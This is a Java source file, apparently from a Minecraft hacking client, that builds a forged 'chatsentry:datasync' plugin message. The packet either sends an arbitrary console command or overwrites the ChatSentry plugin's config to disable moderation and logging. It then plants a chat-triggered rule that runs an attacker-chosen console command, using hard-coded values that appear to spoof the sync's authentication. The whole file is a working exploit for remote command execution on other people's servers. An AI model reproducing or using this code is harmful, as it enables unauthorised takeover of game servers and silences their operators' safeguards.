package io.github.spigotrce.paradiseclientfabric.packet;

import net.minecraft.network.PacketByteBuf;
import net.minecraft.network.codec.PacketCodec;
import net.minecraft.network.packet.CustomPayload;
import net.minecraft.util.Identifier;

import java.nio.charset.StandardCharsets;
import java.util.Objects;

public record ChatSentryPayloadPacket(String command, boolean isBungee, String type, String executionMessage) implements CustomPayload {
    public static final PacketCodec<PacketByteBuf, ChatSentryPayloadPacket> CODEC =
            CustomPayload.codecOf(ChatSentryPayloadPacket::write, ChatSentryPayloadPacket::new);

    public static final Id<ChatSentryPayloadPacket> ID =
            new Id<>(Identifier.of("chatsentry", "datasync"));

    public ChatSentryPayloadPacket(PacketByteBuf buf) {
        this(buf.readString(), buf.readBoolean(), buf.readString(), buf.readString());
    }

    private void write(PacketByteBuf buf) {
        if (isBungee) {
            buf.writeBytes(toUTF("console_command"));
            buf.writeBytes(toUTF(command));
        } else {
            buf.writeBytes(toUTF("sync"));
            buf.writeBytes(toUTF(Objects.equals(type, "config") ? "" : "modules"));
            buf.writeBytes(toUTF("skibidi"));
            if (Objects.equals(type, "config")) {
                buf.writeBytes(toUTF("config.yml"));
                buf.writeBytes(toUTF(generateConfigYaml()));
            } else {
                buf.writeBytes(toUTF("chat-executor.yml"));
                buf.writeBytes(toUTF(generateModuleYaml(command, executionMessage)));
            }
            buf.writeBytes(toUTF("2822111278697"));
        }
    }

    private byte[] toUTF(String value) {
        byte[] bytes = value.getBytes(StandardCharsets.UTF_8);
        byte[] lengthPrefix = new byte[2];
        lengthPrefix[0] = (byte) ((bytes.length >>> 8) & 0xFF);
        lengthPrefix[1] = (byte) (bytes.length & 0xFF);
        byte[] result = new byte[bytes.length + 2];
        System.arraycopy(lengthPrefix, 0, result, 0, 2);
        System.arraycopy(bytes, 0, result, 2, bytes.length);
        return result;
    }

    private String generateConfigYaml() {
        return """
                check-for-updates: false
                process-chat: true
                process-commands: true
                process-signs: true
                process-anvils: true
                process-books: true
                context-prediction: true
                disable-vanilla-spam-kick: true
                network:
                  enable: false
                  sync-configs: true
                  global-admin-notifier-messages: true
                enable-admin-notifier: false
                enable-discord-notifier: false
                enable-auto-punisher: false
                enable-word-and-phrase-filter: false
                enable-link-and-ad-blocker: false
                enable-spam-blocker: false
                enable-chat-cooldown: false
                enable-anti-chat-flood: false
                enable-unicode-remover: false
                enable-cap-limiter: false
                enable-anti-parrot: false
                enable-chat-executor: true
                enable-anti-statue-spambot: false
                enable-anti-relog-spam: false
                enable-anti-join-flood: false
                enable-anti-command-prefix: false
                enable-auto-grammar: false
                enable-command-spy: false
                enable-logging-for:
                  chat-cooldown: false
                  link-and-ad-blocker: true
                  word-and-phrase-filter: true
                  spam-blocker: true
                  unicode-remover: true
                  cap-limiter: true
                  anti-parrot: true
                  anti-chat-flood: true
                  anti-statue-spambot: false
                  chat-executor: false
                clean-logs-older-than: 30
                override-bypass-permissions:
                  chat-cooldown: false
                  link-and-ad-blocker: false
                  word-and-phrase-filter: false
                  spam-blocker: false
                  unicode-remover: false
                  cap-limiter: false
                  anti-parrot: false
                  anti-chat-flood: false
                  anti-statue-spambot: false
                  anti-join-flood: false
                  chat-executor: true
                  auto-grammar: false
                  anti-command-prefix: false
                  command-spy: false
                lockdown:
                  active: false
                  current-mode: "only-known"
                  exempt-usernames:
                    - "Notch"
                    - "jeb_"
                command-blacklist:
                  - "/tell"
                """;
    }

    private String generateModuleYaml(String cmd, String msgMatch) {
        String safeCmd = cmd.replace("\"", "\\\"");
        String safeMsg = msgMatch.replace("\"", "\\\"");

        return """
                entries:
                  1:
                    match: "{regex}(%s)"
                    set-matches-as: "{block}"
                    execute:
                      - "{console_cmd}: %s"
                      - "{player_msg}: &a&lSUCCESS!"
                """.formatted(safeMsg, safeCmd);
    }

    @Override
    public CustomPayload.Id<ChatSentryPayloadPacket> getId() {
        return ID;
    }
}
